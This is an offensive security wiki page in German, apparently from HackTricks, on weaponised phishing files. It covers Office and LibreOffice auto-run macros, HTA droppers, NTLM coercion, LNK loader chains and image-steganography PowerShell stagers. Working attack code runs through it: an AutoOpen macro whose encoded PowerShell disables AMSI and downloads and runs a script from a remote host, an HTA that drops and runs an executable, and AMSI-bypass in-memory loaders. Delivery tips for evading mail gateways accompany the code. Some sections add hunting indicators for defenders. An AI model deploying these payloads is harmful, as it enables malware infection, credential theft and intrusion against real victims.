# Phishing-Dateien und -Dokumente

## Office-Dokumente

Microsoft Word führt vor dem Öffnen einer Datei eine Dateidatenvalidierung durch. Die Datenvalidierung erfolgt in Form einer Identifizierung der Datenstruktur anhand des OfficeOpenXML-Standards. Wenn bei der Identifizierung der Datenstruktur ein Fehler auftritt, wird die analysierte Datei nicht geöffnet.

Normalerweise verwenden Word-Dateien mit Makros die Erweiterung `.docm`. Es ist jedoch möglich, die Datei durch Ändern der Dateierweiterung umzubenennen und ihre Fähigkeit zur Ausführung von Makros beizubehalten.\
Beispielsweise unterstützt eine RTF-Datei von Haus aus keine Makros, aber eine in RTF umbenannte DOCM-Datei wird von Microsoft Word verarbeitet und kann Makros ausführen.\
Dieselben Interna und Mechanismen gelten für die gesamte Microsoft Office Suite (Excel, PowerPoint usw.).

Mit dem folgenden Befehl können Sie überprüfen, welche Erweiterungen von bestimmten Office-Programmen ausgeführt werden:
```bash
assoc | findstr /i "word excel powerp"
```
DOCX-Dateien, die auf eine remote Vorlage verweisen (Datei – Optionen – Add-Ins – Verwalten: Vorlagen – Gehe zu), die Macros enthält, können Macros ebenfalls „ausführen“.

### External Image Load

Gehe zu: _Einfügen --> Schnellbausteine --> Feld_\
_**Kategorien**: Links und Verweise, **Feldnamen**: includePicture, und **Dateiname oder URL**:_ http://<ip>/whatever

![Office Documents - External Image Load: Gehe zu: Einfügen -- Schnellbausteine -- Feld](<../../images/image (155).png>)

### Macros Backdoor

Macros können verwendet werden, um beliebigen Code aus dem Dokument auszuführen.

#### Autoload functions

Je häufiger sie vorkommen, desto wahrscheinlicher werden sie vom AV erkannt.

- AutoOpen()
- Document_Open()

#### Macros Code Examples
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### Metadaten manuell entfernen

Gehe zu **File > Info > Inspect Document > Inspect Document**, wodurch der Document Inspector geöffnet wird. Klicke auf **Inspect** und anschließend neben **Document Properties and Personal Information** auf **Remove All**.

#### Doc Extension

Wähle nach Abschluss das Dropdown-Menü **Save as type** aus und ändere das Format von **`.docx`** zu **Word 97-2003 `.doc`**.\
Der Grund dafür ist, dass du **keine Makros in einer `.docx` speichern kannst** und die **`.docm`**-Extension aufgrund des damit verbundenen **Stigmas** problematisch ist (z. B. hat das Thumbnail-Icon ein großes `!`, und manche Web-/E-Mail-Gateways blockieren sie vollständig). Daher ist diese **Legacy-`.doc`-Extension der beste Kompromiss**.

#### Malicious Macros Generators

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## LibreOffice ODT auto-run macros (Basic)

LibreOffice-Writer-Dokumente können Basic-Makros einbetten und diese beim Öffnen der Datei automatisch ausführen, indem das Makro an das Ereignis **Open Document** gebunden wird (Tools → Customize → Events → Open Document → Macro…).<sup>[[1]](#references)</sup> Ein einfaches Reverse-Shell-Makro sieht folgendermaßen aus:
```vb
Sub Shell
Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```
Beachte die doppelten Anführungszeichen (`""`) innerhalb des Strings – LibreOffice Basic verwendet sie, um wörtliche Anführungszeichen zu maskieren, sodass Payloads, die mit `...==""")` enden, sowohl den inneren Befehl als auch das Shell-Argument korrekt abschließen.

Zustellungstipps:

- Als `.odt` speichern und das Makro an das Dokumentereignis binden, damit es sofort beim Öffnen ausgeführt wird.
- Beim E-Mail-Versand mit `swaks` `--attach @resume.odt` verwenden (das `@` ist erforderlich, damit die Dateibytes und nicht der Dateiname als Anhang gesendet werden). Dies ist entscheidend, wenn SMTP-Server missbraucht werden, die beliebige `RCPT TO`-Empfänger ohne Validierung akzeptieren.

## HTA-Dateien

Eine HTA ist ein Windows-Programm, das **HTML und Skriptsprachen (wie VBScript und JScript) kombiniert**. Es erzeugt die Benutzeroberfläche und wird als eine „vollständig vertrauenswürdige“ Anwendung ausgeführt, ohne den Einschränkungen des Sicherheitsmodells eines Browsers zu unterliegen.

Eine HTA wird mit **`mshta.exe`** ausgeführt, das typischerweise zusammen mit **Internet Explorer** **installiert** wird, wodurch **`mshta` von IE abhängig** ist. Wenn IE deinstalliert wurde, können HTAs daher nicht ausgeführt werden.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## Erzwingen der NTLM-Authentifizierung

Es gibt mehrere Möglichkeiten, **NTLM-Authentifizierung „remote“ zu erzwingen**. Beispielsweise könntest du **unsichtbare Bilder** in E-Mails oder HTML einfügen, auf die der Benutzer zugreifen wird (sogar HTTP MitM?). Oder du sendest dem Opfer die **Adresse von Dateien**, die bereits durch das **Öffnen des Ordners** eine **Authentifizierung** **auslösen**.

**Prüfe diese und weitere Ideen auf den folgenden Seiten:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Vergiss nicht, dass du nicht nur den Hash oder die Authentifizierung stehlen, sondern auch **NTLM-Relay-Angriffe durchführen** kannst:

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

Hochwirksame Kampagnen liefern ein ZIP-Archiv aus, das zwei legitime Täuschungsdokumente (PDF/DOCX) und eine schädliche .lnk-Datei enthält. Der Trick besteht darin, dass der eigentliche PowerShell-Loader nach einem eindeutigen Marker in den Raw-Bytes des ZIP-Archivs gespeichert wird und die .lnk-Datei ihn vollständig im Speicher extrahiert und ausführt.<sup>[[2]](#references)</sup>

Typischer Ablauf, der durch den PowerShell-One-Liner in der .lnk-Datei implementiert wird:

1) Das ursprüngliche ZIP-Archiv in üblichen Pfaden finden: Desktop, Downloads, Documents, %TEMP%, %ProgramData% und im übergeordneten Verzeichnis des aktuellen Arbeitsverzeichnisses.
2) Die ZIP-Bytes lesen und nach einem fest codierten Marker suchen (z. B. xFIQCV). Alles nach dem Marker ist der eingebettete PowerShell-Payload.
3) Das ZIP-Archiv nach %ProgramData% kopieren, dort extrahieren und die Täuschungsdatei .docx öffnen, um einen legitimen Eindruck zu erwecken.
4) AMSI für den aktuellen Prozess umgehen: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Die nächste Stufe deobfuskieren (z. B. alle #-Zeichen entfernen) und im Speicher ausführen.

Beispiel für ein PowerShell-Grundgerüst zum Extrahieren und Ausführen der eingebetteten Stufe:
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
Hinweise
- Die Zustellung missbraucht häufig seriöse PaaS-Subdomains (z. B. *.herokuapp.com) und kann Payloads abhängig von IP/UA filtern (harmlose ZIPs ausliefern).
- Die nächste Stufe entschlüsselt häufig base64/XOR shellcode und führt ihn über Reflection.Emit + VirtualAlloc aus, um Artefakte auf der Festplatte zu minimieren.

Im selben Chain verwendete Persistence
- COM TypeLib hijacking des Microsoft Web Browser control, sodass IE/Explorer oder jede darin eingebettete Anwendung den Payload automatisch erneut startet.<sup>[[2]](#references)[[4]](#references)</sup> Details und sofort verwendbare Befehle finden Sie hier:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- ZIP-Dateien, die die ASCII-Markierungszeichenfolge (z. B. xFIQCV) an die Archivdaten angehängt enthalten.
- .lnk, das übergeordnete Benutzer-/Ordner aufzählt, um die ZIP-Datei zu finden, und ein Täuschungsdokument öffnet.
- AMSI-Tampering über [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Lang laufende Business-Threads, die mit Links unter vertrauenswürdigen PaaS-Domains enden.

## LNK-Decoy-first-Staging → Scheduled-Task-Persistence → vertrauenswürdiges CPL side-loading

Ein weiteres wiederkehrendes Muster ist ein **ein Dokument imitierendes `.lnk`**, das sofort einen harmlosen Köder öffnet, während es die eigentliche Chain im Hintergrund vorbereitet.<sup>[[3]](#references)</sup>

Beobachteter Ablauf:
1. Die Verknüpfung **tarnt sich als PDF** und verwendet `conhost.exe` oder einen ähnlichen Proxy, um einen obfuskierten PowerShell-Downloader zu starten.
2. PowerShell fragmentiert offensichtliche Tokens (`iw''r`, `g''c''i`, `r''e''n`, `c''p''i`, `&(g''cm sch*)`), sodass naive Erkennungen, die nach `iwr`, `gci`, `ren`, `cpi` oder `schtasks` suchen, den Befehl übersehen.
3. Der Stager lädt **zuerst das Täuschungsdokument** herunter, öffnet es für das Opfer und rekonstruiert anschließend die schädlichen Dateien im Hintergrund.
4. Payloads können mit **Junk-Erweiterungen** geschrieben und anschließend durch Entfernen von Füllzeichen umbenannt werden, wodurch das Auftreten offensichtlicher `.exe`- / `.cpl`-Artefakte verzögert wird.
5. Persistence wird mit einem **minutenbasierten Scheduled Task** eingerichtet, der eine vertrauenswürdige Host-Binärdatei aus einem vom Benutzer beschreibbaren Pfad startet.

Minimale Hunting-Hinweise für dieses Muster:
```powershell
# Suspicious split-token PowerShell seen in LNK chains
iw''r
r''e''n
&(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
```
Ein nützliches Staging-Layout, das man erkennen sollte, ist:
- `C:\Users\Public\<decoy>.pdf`
- `C:\Users\Public\<trusted>.exe`
- `C:\Users\Public\<malicious>.cpl` oder `.dll`
- `C:\Windows\Tasks\<blob>.dat`

### Warum die zweite Stufe unauffällig ist

In der Rapid7-Fallstudie startete die geplante Aufgabe wiederholt **`Fondue.exe`** aus `C:\Users\Public\`. Da **`APPWIZ.cpl`** daneben abgelegt war und **`RunFODW`** exportierte, lud die vertrauenswürdige Microsoft-Binärdatei die angreiferkontrollierte CPL per Side-Loading anstelle der legitimen Systemkopie.

Die CPL:
- Liest einen **AES-256-CBC**-Blob aus `C:\Windows\Tasks\editor.dat`
- Entschlüsselt ihn über **Windows CNG / `bcrypt.dll`**
- Allokiert ausführbaren Speicher und kopiert den entschlüsselten Shellcode
- Führt ihn indirekt aus, indem sie den Shellcode-Zeiger als Callback für **`EnumUILanguagesW`** übergibt

Dieser letzte Schritt sollte separat untersucht werden: Malware vermeidet häufig einen direkten Sprung wie `((void(*)())buf)()` und missbraucht stattdessen eine **legitime WinAPI, die Callbacks entgegennimmt**, um die Ausführung zu übertragen.

Der entschlüsselte Payload in dieser Kampagne war **Donut**-Shellcode. Dieser mappte anschließend die finale PE vollständig im Speicher und patchte **AMSI/WLDP/ETW** im aktuellen Prozess, bevor er die Ausführung übergab. Ausführlichere Hinweise zu Side-Loading und speicherresidenter Nachbearbeitung finden sich hier:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
{{#endref}}

{{#ref}}
../../windows-hardening/av-bypass.md
{{#endref}}

Praktische Hunting-Ansatzpunkte:
- `.lnk`, die `powershell.exe` oder `conhost.exe` starten, gefolgt von einem sichtbaren Täuschungsdokument.
- Kurzlebige Downloads nach **`C:\Users\Public\`**, gefolgt von sofortigen Umbenennungen aus unsinnigen Dateierweiterungen.
- Geplante Aufgaben mit unauffälligen Namen wie `GoogleErrorReport`, die aus **benutzerschreibbaren Verzeichnissen** ausgeführt werden.
- Vertrauenswürdige Binärdateien, die **`.cpl`- / `.dll`**-Dateien aus demselben Nicht-Systemverzeichnis laden.
- Base64-Textblobs, die unter **`C:\Windows\Tasks\`** geschrieben und anschließend vom per Side-Loading geladenen Modul gelesen werden.

## Durch Steganografie begrenzte Payloads in Bildern (PowerShell stager)

Aktuelle Loader-Ketten liefern ein verschleiertes JavaScript/VBS aus, das einen Base64-PowerShell-stager dekodiert und ausführt. Dieser stager lädt ein Bild (häufig GIF) herunter, das eine Base64-kodierte .NET-DLL als Klartext zwischen eindeutigen Start-/Endmarkierungen enthält. Das Script sucht nach diesen Begrenzern (in freier Wildbahn beobachtete Beispiele: «<<sudo_png>> … <<sudo_odt>>>»), extrahiert den Text dazwischen, dekodiert ihn per Base64 in Bytes, lädt die Assembly im Speicher und ruft eine bekannte Einstiegsmethode mit der C2-URL auf.<sup>[[5]](#references)</sup>

Arbeitsablauf
- Stufe 1: Archivierter JS/VBS-dropper → dekodiert eingebettetes Base64 → startet den PowerShell-stager mit -nop -w hidden -ep bypass.
- Stufe 2: PowerShell-stager → lädt ein Bild herunter, extrahiert Base64 zwischen den Markierungen, lädt die .NET-DLL im Speicher und ruft ihre Methode auf (z. B. VAI), wobei die C2-URL und Optionen übergeben werden.
- Stufe 3: Der Loader ruft den finalen Payload ab und injiziert ihn typischerweise per Process Hollowing in eine vertrauenswürdige Binärdatei (häufig MSBuild.exe).<sup>[[7]](#references)[[8]](#references)</sup> Mehr über Process Hollowing und die Proxy-Ausführung über vertrauenswürdige Utilities findet sich hier:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

PowerShell-Beispiel zum Extrahieren einer DLL aus einem Bild und Aufrufen einer .NET-Methode im Speicher:

<details>
<summary>PowerShell-Stego-Payload-Extraktor und -Loader</summary>
```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
[string]$Url    = 'https://example.com/payload.gif',
[string]$StartM = '<<sudo_png>>',
[string]$EndM   = '<<sudo_odt>>',
[string]$EntryType = 'Loader',
[string]$EntryMeth = 'VAI',
[string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```
</details>

Notizen
- Dies ist ATT&CK T1027.003 (steganography/marker-hiding).<sup>[[6]](#references)</sup> Marker unterscheiden sich je nach Kampagne.
- AMSI/ETW bypass und String-Deobfuscation werden häufig vor dem Laden der Assembly angewendet.
- Hunting: heruntergeladene Bilder auf bekannte Delimiter scannen; PowerShell identifizieren, das auf Bilder zugreift und unmittelbar Base64-Blobs decodiert.

Siehe auch stego tools und Carving-Techniken:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS-Droppers → Base64 PowerShell-Staging

Eine wiederkehrende Initialphase ist eine kleine, stark obfuskierte `.js`- oder `.vbs`-Datei, die in einem Archiv zugestellt wird. Ihr einziger Zweck besteht darin, einen eingebetteten Base64-String zu decodieren und PowerShell mit `-nop -w hidden -ep bypass` zu starten, um die nächste Stufe über HTTPS zu bootstrappen.<sup>[[5]](#references)</sup>

Skeleton-Logik (abstrakt):
- Eigenen Dateiinhalt lesen
- Einen Base64-Blob zwischen Junk-Strings lokalisieren
- In ASCII-PowerShell decodieren
- Mit `wscript.exe`/`cscript.exe` ausführen und dabei `powershell.exe` aufrufen

Hunting-Hinweise
- Archivierte JS/VBS-Anhänge, die `powershell.exe` mit `-enc`/`FromBase64String` in der Command Line starten.
- `wscript.exe`, das `powershell.exe -nop -w hidden` aus Benutzer-Temp-Pfaden startet.

## Windows-Dateien zum Stehlen von NTLM-Hashes

Siehe die Seite über **Orte zum Stehlen von NTLM-Credentials**:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}


## References

- [1] [HTB Job – LibreOffice-Makro → IIS-Webshell → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [2] [Check Point Research – ZipLine-Kampagne: Ein ausgefeilter Phishing-Angriff auf US-Unternehmen](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Rapid7 – Malware à la Mode: Verfolgung der Tradecraft von Dropping Elephant durch eine China-themed Loader-Kette](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
- [4] [Hijack the TypeLib – Neue COM-Persistence-Technik (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [5] [Unit 42 – PhantomVAI Loader liefert eine Reihe von Infostealern](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [6] [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [7] [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [8] [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)
{{#include ../../banners/hacktricks-training.md}}
